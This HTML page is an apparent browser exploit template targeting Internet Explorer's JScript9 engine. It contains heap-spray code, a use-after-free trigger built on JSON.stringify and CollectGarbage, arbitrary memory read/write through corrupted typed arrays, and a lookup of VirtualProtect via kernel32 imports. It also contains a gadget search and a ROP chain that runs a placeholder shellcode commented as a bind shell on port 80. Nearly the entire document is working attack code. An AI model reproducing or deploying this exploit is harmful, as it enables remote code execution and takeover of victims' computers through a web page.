<html>
    <body>
        <script>
            var arr = []

            function boom() {{
                var obj1 = [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                    obj2 : [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                        obj3 : [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                            obj4 : [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                                obj5 : [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                                    obj6 : [{{ s1:true, s2:true,s3:true,s4:true,s5:true,s6:true,s7:true,s8:true,s9:true,s10:true,s11:true,s12:true,s13:true,s14:true,s15:true,s16:true,s17:true,s18:true,s19:true,
                                        obj7 : [{{ s1:false}}]
                                    }}]
                                }}]
                            }}]
                        }}]
                    }}]
                }}];

                var a = JSON.stringify(obj1, function to_s(k, v) {{return v;}});
                for(var i = 0; i < 8000; i++) {{
                    arr[i] = new ArrayBuffer(12);
                }}

                for(i = 0; i < 8000; i++) {{
                    var data = new Uint32Array(arr[i],0);
                    data[0] = 0x128ef018;
                    data[1] = 0x128ef018;
                    data[2] = 0x128ef018;
                }}
                CollectGarbage();
            }}

            stackpivot_gadget = [0x94, 0xc3];
            var whmem;

            spray = new Array(4096);
            buff = new ArrayBuffer(4);
            size = 0;

            var I = setInterval(function(){{
                for(i = 0; i < 400; i++, size++) {{
                    spray[size] = new Array(15352);
                    for(j = 0; j < 85; j++) {{
                        spray[size][j] = new Uint32Array(buff);
                    }}
                }}

                if(size >= (4096)) {{
                    clearInterval(I);
                    boom();
                    setInterval(check_exploit,100);
                }}
            }}, 100);

            function check_exploit() {{
                var ia_offset = 0x20;

                for(i = 0; i < 4096; i++) {{
                    for(j = 0; j < 85; j++) {{
                        if(spray[i][j].length >= 0x4000000) {{
                            whmem = spray[i][j];

                            for(l = 0x4000000; l < 0x5000000; l += 0x10000) {{
                                if(whmem[l] == 0x80000002) {{
                                    for(m = l; m < 0x8000+l; m += 1) {{
                                        if(whmem[m] == 0x00000001) {{
                                            whmem[m] = 0x7fffffff;
                                            whmem[m+1] = 0x10000;
                                            break;
                                        }}
                                    }}
                                    break;
                                }} else if(whmem[l] == 0x00000001) {{
                                    whmem[l] = 0x7fffffff;
                                    whmem[l+1] = 0x10000;
                                    break;
                                }} else if(whmem[l+1] == 0x00000001) {{
                                    whmem[l+1] = 0x7fffffff;
                                    whmem[l+2] = 0x10000;
                                    break;
                                }} else if(whmem[l+2] == 0x00000001) {{
                                    whmem[l+2] = 0x7fffffff;
                                    whmem[l+3] = 0x10000;
                                    break;
                                }} else if(whmem[l+3] == 0x00000001) {{
                                    whmem[l+3] = 0x7fffffff;
                                    whmem[l+4] = 0x10000;
                                    break;
                                }}
                            }}
                        }}
                    }}
                }}

                for(i = 0; i < 4096; i++) {{
                    for(j = 0; j < 85; j++) {{
                        if(spray[i][j].length == 0x7fffffff) {{
                            whmem = spray[i][j];

                            whmem[indexOfAddr(0x128e0020)] = 0xDEC0DE * 2 | 1;
                            for(current = 0; current < 4096; current++) {{
                                if(spray[current][0] == 0xDEC0DE) {{
                                    break;
                                }}
                            }}
                            if(current == 4096) break;

                            spray[current][2] = new Array(1);
                            spray[current][2][0] = new ArrayBuffer(0xc);
                            array_obj_will_be_hijacked = whmem[indexOfAddr(0x128e0028)];
                            js9_base = whmem[indexOfAddr(array_obj_will_be_hijacked)] & 0xffff0000;

                            vp_addr = find_virtual_protect(whmem, js9_base);
                            if(vp_addr == 0) break;

                            // Bind Shell 80
                            var shellcode = {0};
                            spray[current][1] = new Uint8Array(shellcode);
                            array_to_hold_shellcode = whmem[indexOfAddr(0x128e0024)];
                            shellcode_payload = whmem[indexOfAddr(array_to_hold_shellcode + ia_offset)];

                            var sp = find_gadget(whmem, js9_base, stackpivot_gadget);
                            if(sp == 0) break;

                            arrbuf = new ArrayBuffer(0x500);
                            spray[current][0] = new Uint32Array(arrbuf);
                            array_to_hold_ropchain = whmem[indexOfAddr(0x128e0020)];
                            rop_chain_payload = whmem[indexOfAddr(array_to_hold_ropchain + ia_offset)];

                            spray[current][0][0] = vp_addr;
                            spray[current][0][1] = shellcode_payload;
                            spray[current][0][2] = shellcode_payload;
                            spray[current][0][3] = spray[current][1].length;
                            spray[current][0][4] = 0x40;
                            spray[current][0][5] = rop_chain_payload + ia_offset;
                            spray[current][0][36] = js9_base + sp;

                            whmem[indexOfAddr(array_obj_will_be_hijacked)] = rop_chain_payload;

                            spray[current][2][0] = 0;
                        }}
                    }}
                }}
            }}

            function get_value_from_PE(a, js9_base, offset) {{
                var pe_offset = a[indexOfAddr(js9_base + 0x3c)];
                return a[indexOfAddr(js9_base + pe_offset + offset)];
            }}

            function indexOfAddr(addr) {{
                return Math.floor((addr - 0x10000) / 4);
            }}

            function find_virtual_protect(a, js9_base) {{
                var k32_entry = find_k32_entry(a, js9_base);
                var strings_offset = a[indexOfAddr(k32_entry - 0xc)];
                var func_pointers = a[indexOfAddr(k32_entry + 0x4)];
                var func = new String();
                for(func_ptr = js9_base + func_pointers, s = js9_base + strings_offset; func_ptr != 0 && s != 0; func_ptr += 4, s += 4) {{
                    func = read_string(a, js9_base + a[indexOfAddr(s)] +2);
                    if (func.indexOf('VirtualProtect') > -1) {{
                        return a[indexOfAddr(func_ptr)];
                    }}
                }}
                return 0;
            }}

            function find_k32_entry(a, js9_base) {{
                var import_table_address = js9_base + get_value_from_PE(a, js9_base, 0x80);
                var import_table_size = get_value_from_PE(a, js9_base, 0x84);
                var s = new String();
                for(var i = import_table_address + 0xc; i < js9_base + import_table_address + import_table_size; i += 0x14) {{
                    var import_table_entry = a[indexOfAddr(i)];
                    if(import_table_entry != 0) {{
                        s = read_string(a, js9_base + import_table_entry);
                        if (s.indexOf('KERNEL32') > -1 || s.indexOf('kernel32') > -1) {{
                            return i;
                        }}
                    }}
                }}
                return 0;
            }}

            function read_string(a, addr) {{
                var s = new String();
                var i = 0;
                var c = '';
                for(i = addr; c != String.fromCharCode(0); i++) {{
                    c = String.fromCharCode(read_uint8(a, i));
                    s += c;
                }}
                return s;
            }}

            function read_uint8(a, addr) {{
                var mod = addr % 4;
                var ret = a[indexOfAddr(addr)];

                return ((ret>>(mod*8))%0x100);
            }}

            function find_gadget(a, js9_base, gadget) {{
                for(zz = 0x1000; zz < 0x300000; zz+=4) {{
                    first_dword = a[indexOfAddr(js9_base + zz)];
                    second_dword = a[indexOfAddr(js9_base + zz + 4)];
                    gadget_candidate = uint32_2_array(first_dword);
                    gadget_candidate = gadget_candidate.concat(uint32_2_array(second_dword));
                    off = gadget_candidate.join('').indexOf(gadget.join(''))
                    roff = gadget_candidate.indexOf(gadget[0]);
                    if (off != -1) return zz + roff;
                }}
                return 0;
            }}

            function uint32_2_array(num) {{
                var a = [];
                var k = num;
                for(var i = 0; i < 4; i++, k = k >> 8) {{
                    a.push(k % 0x100);
                }}
                return a;
            }}
        </script>
    </body>
</html>
